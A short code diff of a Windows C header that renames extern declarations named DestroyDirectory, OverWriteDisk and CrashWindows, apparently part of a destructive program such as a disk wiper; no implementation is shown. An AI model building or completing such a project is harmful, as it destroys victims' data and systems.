@@ -3,6 +3,6 @@
 #include <Windows.h>
 #include <AclAPI.h>
 
-extern void DestroyDirectory(PWSTR szDirectory);
-extern void WriteDisk();
+extern void DestroyDirectory(LPWSTR Directory);
+extern void OverWriteDisk();
 extern void CrashWindows();
